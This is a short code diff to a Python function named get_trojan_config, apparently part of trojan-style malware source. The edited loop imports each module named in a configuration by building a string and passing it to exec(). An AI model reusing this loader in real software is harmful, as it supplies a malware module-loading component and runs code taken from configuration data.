@@ -58,8 +58,8 @@ def get_trojan_config():
     configured = True
 
     for task in config:
-        if task['module'] not in sys.modules:
-            exec("import {}".format(task["module"]))
+        if task not in sys.modules:
+            exec("import {}".format(task))
 
     return config
 
